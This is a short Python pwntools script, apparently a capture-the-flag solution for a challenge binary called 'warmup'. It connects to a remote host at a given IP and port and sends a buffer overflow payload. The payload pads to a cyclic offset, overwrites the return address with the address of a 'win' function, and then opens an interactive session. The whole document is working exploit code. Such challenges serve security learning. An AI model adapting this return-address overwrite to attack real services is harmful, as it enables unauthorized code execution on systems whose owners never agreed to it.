from pwn import *

#r = process('./warmup')
#gdb.attach(r)
r = remote('206.189.68.85', 1337)
payload = "A" * cyclic_find('kaaa')
#payload += p64(0)
payload += p64(0x401152)#win
payload += "BBBBBBBB"
payload += "CCCCCCCC"
#payload += p64(0x00000000004011c7)
r.sendlineafter("Algo?", payload)
r.interactive()